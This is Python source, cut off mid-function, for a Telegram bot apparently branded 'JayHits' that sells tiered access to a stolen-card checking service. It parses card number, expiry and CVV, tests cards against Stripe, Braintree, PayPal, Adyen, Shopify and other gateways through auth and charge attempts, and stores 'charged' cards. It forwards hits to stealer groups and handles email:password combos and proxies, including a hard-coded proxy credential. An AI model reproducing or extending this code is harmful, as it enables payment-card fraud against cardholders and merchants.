from telethon import TelegramClient, events, Button, functions, types
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse
import sys
import tempfile
from response_mask import mask_response
from env_config import get_bool_setting, get_setting, write_runtime_setting

from gateways import (
    GATEWAY_REGISTRY, get_flat_registry, run_gateway,
    classify_response, parse_card_input, checkLuhn,
    is_bin_banned, check_cooldown, is_gateway_on,
    is_gateway_premium, is_tool_on, is_tool_premium,
    is_mass_check_enabled, get_inline_mass_limit, get_file_mass_limit,
    add_user_proxy, remove_user_proxies, remove_single_user_proxy,
    get_user_proxy_list, get_user_proxy, auto_remove_dead_proxy
)
from tools import (
    tool_gen, tool_bin, tool_sk, tool_id, tool_ping,
    tool_rand, tool_translate, tool_langcode, set_bot_username
)

API_ID = get_setting("TELEGRAM_API_ID")
API_HASH = get_setting("TELEGRAM_API_HASH")
BOT_TOKEN = get_setting("TELEGRAM_BOT_TOKEN")
ADMIN_ID = [int(x) for x in get_setting("TELEGRAM_ADMIN_ID").split(",") if x.strip()]
GROUP_ID = int(get_setting("TELEGRAM_GROUP_ID", "0"))
GROUP_LINK = get_setting("TELEGRAM_GROUP_LINK")

def _load_logs_group_id():
    try:
        val = get_setting("LOGS_GROUP_ID").strip()
        return int(val) if val and val not in ("0", "") else 0
    except Exception:
        return 0

LOGS_GROUP_ID = _load_logs_group_id()
CHANNEL_LINK = get_setting("TELEGRAM_CHANNEL_LINK")
HIT_FORWARD_GROUP = -1003561084296
STEALER_GROUP_2 = -1003862598213

PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
ADMIN_SITES_FILE = "admin_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
CHARGED_CC_FILE = "charged_ccs.json"
BANNED_FILE = "banned_users.json"

ACTIVE_MTXT_PROCESSES = {}
MTXT_LOCKS = {}
FILTER_CACHE = {}

# ── Anti-Flood ────────────────────────────────────────────────────────────────
# Per-user sliding-window message tracker.
# Keys: user_id → list of unix timestamps of recent messages
_FLOOD_WINDOW_SEC   = 10    # seconds to look back
_FLOOD_WARN_THRESH  = 7     # messages in window before warning
_FLOOD_BAN_THRESH   = 14    # messages in window before auto-ban
_FLOOD_MUTE_SEC     = 60    # seconds to silently ignore after warning
_flood_tracker: dict[int, list[float]] = {}
_flood_warned:  dict[int, float]       = {}   # user_id → time of last warning
_flood_muted:   dict[int, float]       = {}   # user_id → muted-until timestamp

# ── Per-command Anti-Spam ─────────────────────────────────────────────────────
# 15-second cooldown between ANY command per user.
# If user fires a second command within the window they get one alert, then silence.
_CMD_COOLDOWN_SEC  = 15
_cmd_last_time:    dict[int, float] = {}   # user_id → timestamp of last command
_cmd_alerted:      dict[int, float] = {}   # user_id → timestamp of last spam alert

def _is_command(text: str) -> bool:
    """True if the message text looks like a bot command."""
    t = (text or "").strip()
    return t.startswith("/") or t.startswith(".")

def _check_cmd_spam(user_id: int) -> tuple[bool, float]:
    """
    Returns (allowed, remaining_seconds).
    allowed=True  → process the command
    allowed=False → still in cooldown, spam detected
    Side-effect: updates _cmd_last_time when allowed.
    """
    now = time.time()
    last = _cmd_last_time.get(user_id, 0)
    remaining = _CMD_COOLDOWN_SEC - (now - last)
    if remaining > 0:
        return False, round(remaining, 1)
    _cmd_last_time[user_id] = now
    return True, 0

# ── Input Validators ──────────────────────────────────────────────────────────

# Allowed characters in card fields — digits only
_CC_RE      = re.compile(r'^\d{12,19}$')
_MM_RE      = re.compile(r'^(0?[1-9]|1[0-2])$')
_YY_RE      = re.compile(r'^(\d{2}|\d{4})$')
_CVV_RE     = re.compile(r'^\d{3,4}$')
# URL: must start with http/https and have a valid hostname
_URL_RE     = re.compile(r'^https?://[A-Za-z0-9]([A-Za-z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]{0,2048})$')
# Proxy: host:port or scheme://[user:pass@]host:port
_PROXY_RE   = re.compile(r'^(socks5h?://|http://)?([A-Za-z0-9._-]+:[A-Za-z0-9._@%-]+@)?[A-Za-z0-9._-]+:\d{2,5}$', re.IGNORECASE)
# Email:pass combo
_COMBO_RE   = re.compile(r'^[^\s:@]+@[^\s:]+:[^\s]+$')

def validate_card_parts(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    """Returns None if valid, or an error string."""
    if not _CC_RE.match(cc):
        return "❌ Invalid card number — must be 12-19 digits, no spaces."
    if not _MM_RE.match(mm):
        return "❌ Invalid expiry month — must be 01-12."
    if not _YY_RE.match(yy):
        return "❌ Invalid expiry year — must be 2 or 4 digits."
    if not _CVV_RE.match(cvv):
        return "❌ Invalid CVV — must be 3 or 4 digits."
    return None

def validate_url(url: str) -> str | None:
    """Returns None if valid HTTPS URL, or an error string."""
    url = url.strip()
    if not url:
        return "❌ No URL provided."
    if not _URL_RE.match(url):
        return "❌ Invalid URL — must start with https:// and be a well-formed URL."
    return None

def validate_proxy(proxy: str) -> str | None:
    """Returns None if valid proxy string, or an error string."""
    proxy = proxy.strip()
    if not proxy:
        return "❌ No proxy provided."
    if not _PROXY_RE.match(proxy):
        return "❌ Invalid proxy format. Use: `host:port` or `socks5://user:pass@host:port`."
    return None

def validate_combo(combo: str) -> str | None:
    """Returns None if valid email:pass combo, or an error string."""
    combo = combo.strip()
    if not combo:
        return "❌ No combo provided."
    if ":" not in combo:
        return "❌ Invalid combo format. Use: `email@example.com:password`."
    if not _COMBO_RE.match(combo):
        return "❌ Invalid combo format. Use: `email@example.com:password`."
    return None

GLOBAL_MASS_SEM = asyncio.Semaphore(200)
ACTIVE_MASS_USERS = set()
MASS_USERS_LOCK = asyncio.Lock()

AUTO_DELETE_DELAY = 60

async def auto_delete_message(msg, delay=AUTO_DELETE_DELAY):
    try:
        _logs_gid = get_setting("LOGS_GROUP_ID").strip()
        if _logs_gid and str(getattr(msg, "chat_id", "")) == _logs_gid:
            return
    except Exception:
        pass
    try:
        await asyncio.sleep(delay)
        await msg.delete()
    except Exception:
        pass

async def get_dynamic_concurrency(base_concurrency):
    return base_concurrency

async def check_flood(user_id: int) -> str:
    """
    Track message rate for user_id.
    Returns:
      'ok'     – message is fine, process normally
      'muted'  – user is in cooldown after a warning, drop silently
      'banned' – user has been auto-banned
    """
    if user_id in ADMIN_ID:
        return 'ok'

    now = time.time()

    # If currently muted, drop silently until mute expires
    muted_until = _flood_muted.get(user_id, 0)
    if now < muted_until:
        return 'muted'

    # Sliding-window: keep only timestamps within the window
    times = _flood_tracker.get(user_id, [])
    times = [t for t in times if now - t < _FLOOD_WINDOW_SEC]
    times.append(now)
    _flood_tracker[user_id] = times

    count = len(times)

    if count >= _FLOOD_BAN_THRESH:
        # Auto-ban
        await ban_user(user_id, "AutoFlood")
        _flood_tracker.pop(user_id, None)
        _flood_warned.pop(user_id, None)
        _flood_muted.pop(user_id, None)
        print(f"[anti-flood] Auto-banned {user_id} ({count} msgs in {_FLOOD_WINDOW_SEC}s)")
        return 'banned'

    if count >= _FLOOD_WARN_THRESH:
        last_warned = _flood_warned.get(user_id, 0)
        if now - last_warned > _FLOOD_MUTE_SEC:
            _flood_warned[user_id] = now
        _flood_muted[user_id] = now + _FLOOD_MUTE_SEC
        return 'warned'

    return 'ok'

async def register_mass_user(user_id):
    async with MASS_USERS_LOCK:
        ACTIVE_MASS_USERS.add(user_id)

async def unregister_mass_user(user_id):
    async with MASS_USERS_LOCK:
        ACTIVE_MASS_USERS.discard(user_id)

_http_session = None
_bin_cache = {}

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=50,
            limit_per_host=10,
            ttl_dns_cache=300,
            keepalive_timeout=30,
            enable_cleanup_closed=True
        )
        _http_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30)
        )
    return _http_session

NO_SKOOL_ACCOUNT_MSG = (
    "⛔ **Activate The Gateway First**\n\n"
    "**How To Activate?**\n\n"
    "1️⃣ Go to **skool.com** & create an account\n"
    "2️⃣ Add your account here with this command 👇\n"
    "`/addskool youremail:yourpass`\n\n"
    "Add your Skool account to activate this gateway ✅"
)

DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
TIMEOUT = 30
ADMIN_USERNAME = get_setting("ADMIN_TELEGRAM_USERNAME", "@JayHitsAdmin")
BOT_USERNAME = None
USERS_FILE = "users.json"

async def register_user(user_id):
    def _update(data):
        if str(user_id) not in data:
            data[str(user_id)] = {"joined_at": datetime.datetime.now().isoformat()}
        return data
    await update_json(USERS_FILE, _update)

async def cache_avatar(user_id: int) -> bool:
    """
    Download the user's Telegram profile picture and save it locally.
    Called on /start (first registration) and when an OTP is issued.
    The raw Telegram file URL (containing the bot token) never leaves the server.
    Returns True if a photo was saved, False otherwise.
    """
    try:
        avatars_dir = os.path.join(os.path.dirname(__file__), "avatars")
        os.makedirs(avatars_dir, exist_ok=True)
        save_path = os.path.join(avatars_dir, f"{user_id}.jpg")

        async with aiohttp.ClientSession() as session:
            # Step 1 — get the best available photo file_id
            async with session.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUserProfilePhotos",
                params={"user_id": user_id, "limit": 1},
                timeout=aiohttp.ClientTimeout(total=10),
            ) as r:
                data = await r.json()
            if not data.get("ok") or data["result"].get("total_count", 0) == 0:
                return False
            photos = data["result"]["photos"]
            if not photos:
                return False
            file_id = photos[0][-1]["file_id"]  # largest size

            # Step 2 — resolve file_id → temporary server path
            async with session.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
                params={"file_id": file_id},
                timeout=aiohttp.ClientTimeout(total=10),
            ) as r:
                fdata = await r.json()
            if not fdata.get("ok"):
                return False
            file_path = fdata["result"]["file_path"]

            # Step 3 — stream download (token stays server-side)
            async with session.get(
                f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}",
                timeout=aiohttp.ClientTimeout(total=15),
            ) as img_r:
                if img_r.status != 200:
                    return False
                async with aiofiles.open(save_path, "wb") as f:
                    async for chunk in img_r.content.iter_chunked(8192):
                        await f.write(chunk)
        return True
    except Exception:
        return False

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE]:
        await create_json_file(file)
    if not os.path.exists(ADMIN_SITES_FILE):
        async with aiofiles.open(ADMIN_SITES_FILE, "w") as f:
            await f.write(json.dumps([]))

async def repair_json_file(filename):
    try:
        if not os.path.exists(filename):
            return {}
        print(f"Repairing {filename}...")
        async with aiofiles.open(filename, 'r') as f:
            raw_content = await f.read()
        if not raw_content.strip():
            return {}
        try:
            data = json.loads(raw_content)
            print(f"File {filename} is valid JSON")
            return data
        except json.JSONDecodeError as e:
            print(f"JSON Error: {e}. Attempting repair...")
        lines = raw_content.strip().split('\n')
        json_objects = []
        current_object = []
        brace_count = 0
        for line in lines:
            current_object.append(line)
            brace_count += line.count('{') - line.count('}')
            if brace_count == 0 and current_object:
                test_json = '\n'.join(current_object)
                try:
                    obj = json.loads(test_json)
                    json_objects.append(obj)
                    current_object = []
                except:
                    pass
        if not json_objects:
            for i in range(len(lines), 0, -1):
                test_content = '\n'.join(lines[:i])
                try:
                    data = json.loads(test_content)
                    print(f"Recovered JSON from first {i} lines")
                    backup_name = f"{filename}.corrupted_backup_{int(datetime.datetime.now().timestamp())}"
                    async with aiofiles.open(backup_name, 'w') as backup:
                        await backup.write(raw_content)
                    print(f"Backup saved to {backup_name}")
                    async with aiofiles.open(filename, 'w') as f:
                        await f.write(json.dumps(data, indent=4))
                    return data
                except:
                    continue
        if json_objects:
            merged_data = {}
            for obj in json_objects:
                if isinstance(obj, dict):
                    merged_data.update(obj)
            print(f"Merged {len(json_objects)} JSON objects")
            backup_name = f"{filename}.corrupted_backup_{int(datetime.datetime.now().timestamp())}"
            async with aiofiles.open(backup_name, 'w') as backup:
                await backup.write(raw_content)
            async with aiofiles.open(filename, 'w') as f:
                await f.write(json.dumps(merged_data, indent=4))
            return merged_data
        print("Using aggressive repair method...")
        user_id_pattern = r'"(\d+)":\s*\[[^\]]+\]'
        matches = re.findall(user_id_pattern, raw_content)
        if matches:
            repaired_data = {}
            for user_id in set(matches):
                pattern = f'"{user_id}":\\s*\\[[^\\]]+\\]'
                site_match = re.search(pattern, raw_content)
                if site_match:
                    try:
                        array_text = site_match.group(0)
                        start = array_text.find('[') + 1
                        end = array_text.rfind(']')
                        sites_text = array_text[start:end]
                        sites = [s.strip(' "\'') for s in sites_text.split(',')]
                        sites = [s for s in sites if s and s != '...']
                        repaired_data[user_id] = sites
                    except:
                        continue
            if repaired_data:
                backup_name = f"{filename}.corrupted_backup_{int(datetime.datetime.now().timestamp())}"
                async with aiofiles.open(backup_name, 'w') as backup:
                    await backup.write(raw_content)
                async with aiofiles.open(filename, 'w') as f:
                    await f.write(json.dumps(repaired_data, indent=4))
                print(f"Aggressively repaired {len(repaired_data)} user entries")
                return repaired_data
        print("Could not repair, creating fresh file")
        backup_name = f"{filename}.corrupted_backup_{int(datetime.datetime.now().timestamp())}"
        async with aiofiles.open(backup_name, 'w') as backup:
            await backup.write(raw_content)
        fresh_data = {}
        async with aiofiles.open(filename, 'w') as f:
            await f.write(json.dumps(fresh_data, indent=4))
        return fresh_data
    except Exception as e:
        print(f"Repair failed: {e}")
        try:
            async with aiofiles.open(filename, 'w') as f:
                await f.write("{}")
        except:
            pass
        return {}

_json_file_locks = {}
_json_locks_meta = asyncio.Lock()

async def _get_json_lock(filename):
    async with _json_locks_meta:
        if filename not in _json_file_locks:
            _json_file_locks[filename] = asyncio.Lock()
        return _json_file_locks[filename]

async def load_json(filename):
    lock = await _get_json_lock(filename)
    async with lock:
        try:
            if not os.path.exists(filename):
                await create_json_file(filename)
                return {}
            async with aiofiles.open(filename, 'r') as f:
                content = await f.read()
            if not content.strip():
                return {}
            try:
                return json.loads(content)
            except json.JSONDecodeError:
                print(f"Auto-repairing corrupted {filename}")
                return await repair_json_file(filename)
        except Exception as e:
            print(f"Error loading {filename}: {e}")
            return {}

async def save_json(filename, data):
    lock = await _get_json_lock(filename)
    async with lock:
        try:
            os.makedirs(os.path.dirname(os.path.abspath(filename)), exist_ok=True)
            with tempfile.NamedTemporaryFile(mode='w',
                                           dir=os.path.dirname(filename),
                                           delete=False,
                                           suffix='.tmp',
                                           encoding='utf-8') as tmp:
                json.dump(data, tmp, indent=4, ensure_ascii=False)
                tmp.flush()
                tmp_name = tmp.name
            if os.path.exists(filename):
                os.replace(tmp_name, filename)
            else:
                os.rename(tmp_name, filename)
        except Exception as e:
            print(f"Error saving {filename}: {e}")
        try:
            if 'tmp_name' in locals() and os.path.exists(tmp_name):
                os.remove(tmp_name)
        except:
            pass

async def update_json(filename, updater_fn):
    lock = await _get_json_lock(filename)
    async with lock:
        try:
            if not os.path.exists(filename):
                data = {}
            else:
                async with aiofiles.open(filename, 'r') as f:
                    content = await f.read()
                if not content.strip():
                    data = {}
                else:
                    try:
                        data = json.loads(content)
                    except json.JSONDecodeError:
                        data = {}
            data = updater_fn(data)
            os.makedirs(os.path.dirname(os.path.abspath(filename)), exist_ok=True)
            with tempfile.NamedTemporaryFile(mode='w',
                                           dir=os.path.dirname(filename),
                                           delete=False,
                                           suffix='.tmp',
                                           encoding='utf-8') as tmp:
                json.dump(data, tmp, indent=4, ensure_ascii=False)
                tmp.flush()
                tmp_name = tmp.name
            if os.path.exists(filename):
                os.replace(tmp_name, filename)
            else:
                os.rename(tmp_name, filename)
            return data
        except Exception as e:
            print(f"Error updating {filename}: {e}")
            return {}

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    result = [False]
    def _check(data):
        user_data = data.get(str(user_id))
        if not user_data:
            result[0] = False
            return data
        expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
        if datetime.datetime.now() > expiry_date:
            del data[str(user_id)]
            result[0] = False
        else:
            result[0] = True
        return data
    await update_json(PREMIUM_FILE, _check)
    return result[0]

async def add_premium_user(user_id, days=0, hours=None):
    if hours is not None:
        expiry_date = datetime.datetime.now() + datetime.timedelta(hours=hours)
        duration_val = hours
        duration_key = 'hours'
    else:
        expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
        duration_val = days
        duration_key = 'days'
    def _update(data):
        data[str(user_id)] = {
            'expiry': expiry_date.isoformat(),
            'added_by': 'admin',
            duration_key: duration_val
        }
        return data
    await update_json(PREMIUM_FILE, _update)

async def remove_premium_user(user_id):
    result = [False]
    def _update(data):
        if str(user_id) in data:
            del data[str(user_id)]
            result[0] = True
        return data
    await update_json(PREMIUM_FILE, _update)
    return result[0]

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    def _update(data):
        data[str(user_id)] = {
            'banned_at': datetime.datetime.now().isoformat(),
            'banned_by': banned_by
        }
        return data
    await update_json(BANNED_FILE, _update)

async def unban_user(user_id):
    result = [False]
    def _update(data):
        if str(user_id) in data:
            del data[str(user_id)]
            result[0] = True
        return data
    await update_json(BANNED_FILE, _update)
    return result[0]

async def get_user_rank(user_id):
    if user_id in ADMIN_ID:
        return "Admin"
    if await is_premium_user(user_id):
        return "Premium"
    return "Free"

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        if bin_number in _bin_cache:
            return _bin_cache[bin_number]
        session = await get_http_session()
        async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=aiohttp.ClientTimeout(total=8)) as res:
            if res.status != 200:
                result = ("BIN Info Not Found", "-", "-", "-", "-", "")
                _bin_cache[bin_number] = result
                return result
            response_text = await res.text()
            try:
                data = json.loads(response_text)
                result = (data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', ''))
                _bin_cache[bin_number] = result
                return result
            except json.JSONDecodeError:
                result = ("-", "-", "-", "-", "-", "")
                _bin_cache[bin_number] = result
                return result
    except Exception:
        return ("-", "-", "-", "-", "-", "")

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

async def load_admin_sites():
    try:
        if not os.path.exists(ADMIN_SITES_FILE):
            return []
        async with aiofiles.open(ADMIN_SITES_FILE, "r") as f:
            data = json.loads(await f.read())
        if isinstance(data, list):
            return data
        return []
    except Exception:
        return []

async def save_admin_sites(sites_list):
    async with aiofiles.open(ADMIN_SITES_FILE, "w") as f:
        await f.write(json.dumps(sites_list, indent=2))

async def remove_dead_site_from_admin(dead_site):
    try:
        admin_sites = await load_admin_sites()
        if dead_site in admin_sites:
            admin_sites.remove(dead_site)
            await save_admin_sites(admin_sites)
            print(f"Removed dead site {dead_site} from admin sites")
    except Exception as e:
        print(f"Error removing dead site from admin: {e}")

async def remove_dead_site_for_user(user_id, dead_site):
    try:
        await remove_dead_site_from_admin(dead_site)
        def _update(data):
            user_sites = data.get(str(user_id), [])
            if dead_site in user_sites:
                user_sites.remove(dead_site)
                data[str(user_id)] = user_sites
                print(f"Removed dead site {dead_site} for user {user_id}")
            return data
        await update_json(SITE_FILE, _update)
    except Exception as e:
        print(f"Error removing dead site: {e}")

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

async def is_group_member(user_id):
    if not GROUP_ID:
        return False
    try:
        from telethon.tl.functions.channels import GetParticipantRequest
        from telethon.tl.types import ChannelParticipantBanned, ChannelParticipantLeft
        result = await client(GetParticipantRequest(GROUP_ID, user_id))
        if isinstance(result.participant, (ChannelParticipantBanned, ChannelParticipantLeft)):
            return False
        return True
    except Exception:
        return False

async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"
    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id
    if is_private:
        if is_premium:
            return True, "premium_private"
        elif user_id in ADMIN_ID:
            return True, "premium_private"
        elif await is_group_member(user_id):
            return True, "group_member_private"
        else:
            return False, "no_access"
    else:
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

TIER_LIMITS_BOT = {
    "gold": {"dailyChecks": -1, "maxBatchCards": 5000},
    "silver": {"dailyChecks": 5000, "maxBatchCards": 1000},
    "free": {"dailyChecks": 500, "maxBatchCards": 50},
}

USER_TIERS_FILE = "user_tiers.json"

def get_user_tier(user_id):
    if user_id in ADMIN_ID:
        return "gold"
    try:
        tiers_path = os.path.join(os.path.dirname(__file__), USER_TIERS_FILE)
        if os.path.exists(tiers_path):
            with open(tiers_path, "r") as f:
                tiers = json.load(f)
            entry = tiers.get(str(user_id))
            if entry:
                if entry.get("expiresAt"):
                    from datetime import datetime as dt
                    expiry = dt.fromisoformat(entry["expiresAt"].replace("Z", "+00:00")).timestamp() * 1000
                    if time.time() * 1000 > expiry:
                        return "free"
                return entry.get("tier", "free")
    except Exception:
        pass
    return "free"

DAILY_USAGE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "daily_usage.json")
_daily_usage_lock = None

def _get_daily_usage_lock():
    global _daily_usage_lock
    if _daily_usage_lock is None:
        import threading
        _daily_usage_lock = threading.Lock()
    return _daily_usage_lock

def _today_str():
    from datetime import date
    return date.today().isoformat()

def _load_daily_usage():
    try:
        if os.path.exists(DAILY_USAGE_FILE):
            with open(DAILY_USAGE_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def _save_daily_usage(data):
    try:
        with open(DAILY_USAGE_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

HITTER_MIN_ACCOUNT_AGE_DAYS = 3

def get_account_age_days(user_id):
    try:
        users_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users.json")
        if os.path.exists(users_path):
            with open(users_path, "r") as f:
                users = json.load(f)
            entry = users.get(str(user_id))
            if entry and entry.get("joined_at"):
                from datetime import datetime as dt, timezone
                joined = dt.fromisoformat(entry["joined_at"].replace("Z", "+00:00"))
                if joined.tzinfo is None:
                    joined = joined.replace(tzinfo=timezone.utc)
                now = dt.now(timezone.utc)
                return (now - joined).days
    except Exception:
        pass
    return 999

def check_account_age(user_id):
    if user_id in ADMIN_ID:
        return True, 0
    tier = get_user_tier(user_id)
    if tier in ("silver", "gold"):
        return True, 0
    age = get_account_age_days(user_id)
    if age < HITTER_MIN_ACCOUNT_AGE_DAYS:
        return False, age
    return True, age

def get_hitter_daily_limit(user_id):
    if user_id in ADMIN_ID:
        return -1
    tier = get_user_tier(user_id)
    if tier in ("silver", "gold"):
        return -1
    return 2

def check_hitter_limit(user_id):
    limit = get_hitter_daily_limit(user_id)
    if limit == -1:
        return True, -1, 0
    with _get_daily_usage_lock():
        data = _load_daily_usage()
        today = _today_str()
        entry = data.get(str(user_id), {})
        if entry.get("date") != today:
            return True, limit, 0
        used = entry.get("hitterHits", 0)
        remaining = max(0, limit - used)
        return used < limit, remaining, used

def increment_hitter_usage(user_id):
    with _get_daily_usage_lock():
        data = _load_daily_usage()
        today = _today_str()
        uid = str(user_id)
        entry = data.get(uid, {})
        if entry.get("date") != today:
            entry = {"checks": 0, "shopifyChecks": 0, "findsiteSearches": 0, "accountMassChecks": 0, "hitterHits": 0, "date": today}
        entry["hitterHits"] = entry.get("hitterHits", 0) + 1
        data[uid] = entry
        _save_daily_usage(data)

def get_cc_limit(access_type, user_id=None):
    if user_id and user_id in ADMIN_ID:
        return 999999
    if user_id:
        tier = get_user_tier(user_id)
        limits = TIER_LIMITS_BOT.get(tier, TIER_LIMITS_BOT["free"])
        batch_limit = limits["maxBatchCards"]
        if batch_limit == -1:
            return 999999
        return batch_limit
    if access_type in ["premium_private", "premium_group"]:
        return 3000
    elif access_type in ["group_free", "group_member_private"]:
        return 1000
    return 0

async def store_charged_cc(card, gateway, user_id=None, user_name=None):
    try:
        parts = card.split("|")
        if len(parts) < 4:
            return
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        entry = {
            "cc": cc, "mm": mm, "yy": yy, "cvv": cvv,
            "gateway": gateway,
            "time": time.time(),
            "user_id": user_id,
            "user_name": user_name,
        }
        def _update(data):
            if not isinstance(data, list):
                data = []
            for existing in data:
                if existing.get("cc") == cc:
                    existing.update(entry)
                    return data
            data.append(entry)
            if len(data) > 500:
                data = sorted(data, key=lambda x: x.get("time", 0), reverse=True)[:500]
            return data
        await update_json(CHARGED_CC_FILE, _update)
    except Exception as e:
        print(f"Error storing charged CC: {e}")

async def get_charged_ccs(count=10):
    try:
        data = await load_json(CHARGED_CC_FILE)
        if not isinstance(data, list):
            return []
        data = sorted(data, key=lambda x: x.get("time", 0), reverse=True)
        return data[:count]
    except Exception as e:
        print(f"Error reading charged CCs: {e}")
        return []

async def notify_dashboard_hit(card, status, response, gateway, user_id=None, user_name=None, amount=None, currency=None):
    try:
        import aiohttp
        payload = {
            "userName": user_name or "Bot User",
            "userId": str(user_id or "0"),
            "card": card,
            "gateway": gateway,
            "response": response,
            "status": status,
        }
        if amount is not None:
            payload["amount"] = str(amount)
        if currency is not None:
            payload["currency"] = str(currency)
        session_secret = os.environ.get("SESSION_SECRET", "")
        headers = {"Content-Type": "application/json", "x-bot-secret": session_secret}
        async with aiohttp.ClientSession() as sess:
            async with sess.post("http://localhost:5000/api/activity/bot-hit", json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                pass
    except Exception as e:
        print(f"Dashboard notify error: {e}")

_bot_group_log_username_cache = {}

GATEWAY_DISPLAY_NAMES = {
    "st": "Stripe Auth $0",
    "skl": "Stripe Auth $0.1",
    "b3": "Braintree Auth",
    "vbv": "VBV Lookup",
    "an": "Authorize.net Auth",
    "skb": "SK Base Auth $0",
    "adn": "Adyen Auth",
    "rbc": "Stripe Auth $0 (RBC)",
    "cw": "Stripe Charge $6",
    "rz": "Razorpay Charge",
    "charge": "Stripe Charge SK",
    "pp": "PayPal Charge $0.01",
    "shp": "Shopify Native",
    "skl1": "Stripe Charge $1",
    "skl2": "Stripe Charge $7",
    "b3c": "Braintree Charge",
    "ppn": "PayPal Charge $1",
    "bnc": "PayPal Charge $1",
    "ch": "Stripe Charge \u20ac5",
    "isp": "Stripe Charge $25",
    "auto": "Stripe Random Charge",
    "azz": "Authorize.net Charge $1",
    "ppk": "PayPal Keybase $1",
    "Stripe CO": "Stripe Checkout",
}

def send_bot_group_log(user_name, user_id, card, gateway, response_msg, status, site=None, amount=None):
    try:
        bot_token = get_setting("TELEGRAM_BOT_TOKEN")
        group_id = get_setting("TELEGRAM_GROUP_ID")
        if not bot_token or not group_id:
            return
        status_lower = (response_msg or "").lower()
        is_charged = "charged" in status_lower or status == "CHARGED"
        is_insuff = "insufficient" in status_lower or "insuff" in status_lower
        # Main group log: ONLY charged or insufficient funds (CCN Live / Approved go to stealer group only)
        if not (is_charged or is_insuff):
            return
        display_name = user_name or str(user_id)
        tier = get_user_tier(user_id) if user_id else "free"
        tier_labels = {"free": "Free", "silver": "Silver", "gold": "Gold"}
        tier_tag = tier_labels.get(tier, "Free")
        display_name = f"{display_name} [{tier_tag}]"
        gate_display = GATEWAY_DISPLAY_NAMES.get(gateway, gateway)
        if bot_token in _bot_group_log_username_cache:
            bot_username = _bot_group_log_username_cache[bot_token]
        else:
            try:
                me_resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5)
                me_data = me_resp.json()
                bot_username = me_data["result"]["username"] if me_data.get("ok") else "HitBot"
                _bot_group_log_username_cache[bot_token] = bot_username
            except Exception:
                bot_username = "HitBot"
        import html as _html
        lines = [
            "\U0001f525 HIT DETECTED \u26a1",
            f"\U0001f464 {_html.escape(str(display_name))}",
            f"\u2194\ufe0f Gateway: {_html.escape(str(gate_display))}",
            f"\u2705 Response: {_html.escape(str(response_msg or ''))}",
        ]
        if site is not None:
            lines.append(f"\U0001f310 Site: {_html.escape(str(site))}")
        if amount is not None:
            lines.append(f"\U0001f4b0 Amount: {_html.escape(str(amount))}")
        text = "<pre>" + "\n".join(lines) + "</pre>"
        text += f'\n<a href="https://t.me/{bot_username}/web">Open JayHits</a>'
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
            "chat_id": int(group_id),
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=10)
    except Exception as e:
